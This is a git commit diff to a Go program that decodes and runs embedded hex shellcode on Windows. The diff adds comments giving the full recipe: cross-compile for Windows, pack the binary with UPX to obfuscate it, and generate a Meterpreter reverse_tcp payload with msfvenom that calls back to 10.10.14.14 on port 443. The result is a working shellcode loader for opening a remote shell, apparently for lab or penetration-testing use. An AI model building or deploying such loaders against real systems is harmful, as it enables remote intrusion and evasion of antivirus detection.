452fbf5b3a6ec3da319c10cc447631fbb41f5871
kymb0 <55473161+kymb0@users.noreply.github.com>
2021-01-26 22:12:57 +0930

    Update main.go

--- cmd/sc/main.go
+++ cmd/sc/main.go
@@ -1,36 +1,31 @@
+//compile: set GOOS=windows; set GOARCH=amd64; go build
+//obfuscate: upx compress sc.exe --brute
+//spin shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -b \x00 -f hex 
+
 package main
 
 import (
 	"encoding/hex"
 	"fmt"
-	"io/ioutil"
 	"os"
 
 	shellcode "github.com/brimstone/go-shellcode"
 )
 
-// This program runs the shellcode from: https://www.exploit-db.com/exploits/40245/
-//
-// As the shellcode is 32 bit, this must also be compiled as a 32 bit go application
-// via "set GOARCH=386"
+// This is the main.go for https://github.com/brimstone/go-shellcode/. Full code should be taken from there, and full credit to Brimstone for the fine work.
 
 func main() {
 
-	if len(os.Args) != 2 {
-		fmt.Printf("Must have shellcode of file\n")
+	//if len(os.Args) != 2 {
+	//	fmt.Printf("Must have shellcode\n")
+	//	os.Exit(1)
+	//}
+	sc :="SHELLCODE-GOES-HERE"
+	sc_bin, err := hex.DecodeString(sc)
+	if err != nil {
+		fmt.Printf("Error decoding arg 1: %s\n", err)
 		os.Exit(1)
 	}
 
-	// First, try to read the arg as a file
-	sc, err := ioutil.ReadFile(os.Args[1])
-	if os.IsNotExist(err) {
-		// If that fails, try to interpret the arg as hex encoded
-		sc, err = hex.DecodeString(os.Args[1])
-		if err != nil {
-			fmt.Printf("Error decoding arg 1: %s\n", err)
-			os.Exit(1)
-		}
-	}
-
-	shellcode.Run(sc)
+	shellcode.Run(sc_bin)
 }
